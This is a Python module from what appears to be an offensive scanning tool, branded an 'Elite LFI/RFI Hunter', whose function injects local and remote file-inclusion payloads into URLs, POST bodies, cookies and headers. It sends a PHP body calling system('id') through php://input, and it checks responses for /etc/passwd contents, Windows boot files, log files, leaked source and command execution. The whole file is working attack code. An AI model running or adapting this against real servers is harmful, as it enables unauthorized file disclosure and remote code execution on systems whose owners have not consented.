from core import Requester, logger
from typing import Optional, Dict, Any
import urllib.parse

# This keeps the HTTP/2 connection open for all threads to share!
req = Requester()

def check_traversal(
    payload: str,
    base_url: str,
    method: str = "GET",
    post_data: Optional[Dict[str, Any]] = None,
    cookies: Optional[Dict[str, str]] = None,
    headers: Optional[Dict[str, str]] = None
) -> Optional[str]:
    """
    Elite LFI/RFI Hunter v4.1 — The "No Mercy" Edition.
    Now correctly injects payloads into Cookies and Headers.
    """

    # ———— 1. Build Target URL ————
    target = base_url
    if "{PAYLOAD}" in base_url:
        encoded_payload = urllib.parse.quote(payload, safe='/')
        target = base_url.replace("{PAYLOAD}", payload)

    # ———— 2. Prepare Data & Method ————
    effective_method = method.upper()
    
    # [Sanchez Fix] Initialize dictionaries carefully
    effective_data = post_data.copy() if post_data else {}
    effective_cookies = cookies.copy() if cookies else {}
    effective_headers = headers.copy() if headers else {}

    # ———— 3. INJECT PAYLOAD EVERYWHERE ————
    
    # A. Inject into POST Data
    if effective_data:
        for key, value in effective_data.items():
            if isinstance(value, str) and "{PAYLOAD}" in value:
                effective_data[key] = value.replace("{PAYLOAD}", payload)

    # B. Inject into Cookies (THE MISSING LINK 🔗)
    if effective_cookies:
        for key, value in effective_cookies.items():
            if isinstance(value, str) and "{PAYLOAD}" in value:
                effective_cookies[key] = value.replace("{PAYLOAD}", payload)

    # C. Inject into Headers (For Log Poisoning or Referer attacks)
    if effective_headers:
        for key, value in effective_headers.items():
            if isinstance(value, str) and "{PAYLOAD}" in value:
                effective_headers[key] = value.replace("{PAYLOAD}", payload)

    # ———— 4. Scenario 2: php://input Auto-Switch ————
    if "php://input" in payload or "data://" in payload:
        effective_method = "POST"
        effective_data = "<?php echo 'RCE_CONFIRMED_SANCHEZ'; system('id'); die(); ?>"
        effective_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

    # ———— 5. Fire the Shot ————
    #req = Requester()
    # SANCHEZ DEBUG: Show me the exact target!
    if "passwd" in target or "boot.ini" in target: # Only print for interesting ones to avoid spam
        logger.debug(f"🔫 SHOOTING: {target}")

    try:
        if effective_method == "POST":
            res = req.post(
                url=target,
                data=effective_data,
                cookies=effective_cookies, # Use the injected cookies
                headers=effective_headers, # Use the injected headers
                allow_redirects=False,
                timeout=12
            )
        else:
            res = req.get(
                url=target,
                cookies=effective_cookies, # Use the injected cookies
                headers=effective_headers, # Use the injected headers
                allow_redirects=False,
                timeout=12
            )
    except Exception:
        return None

    if not res:
        return None

    content = res.text
    size = len(content)

    # ———— 6. VAR Review (Signatures) ————
    
    # RCE Check
    if "RCE_CONFIRMED_SANCHEZ" in content or ("uid=" in content and "gid=" in content):
        return f"🚨 RCE ACHIEVED → {target} ({size:,} bytes)"

    # Log File Check
    log_signatures = ["GET /", "User-Agent:", "[LOG] Hit from UA:", "Apache/2", "127.0.0.1 - - ["]
    if any(sig in content for sig in log_signatures):
        return f"🪵 LOG FILE FOUND → {target} ({size:,} bytes)"

    # Source Code Check (For lab.py)
    source_sigs = ["def home():", "import os", "from flask", "<?php", "#!/usr/bin/env"]
    if any(sig in content for sig in source_sigs):
        if "<html" not in content.lower():
            return f"📜 SOURCE CODE LEAK → {target} ({size:,} bytes)"

    # Standard LFI Checks
    if "root:x:0:0:" in content: return f"🔥 LFI (Linux) → {target}"
    if "[boot loader]" in content: return f"🔥 LFI (Windows) → {target}"

    return None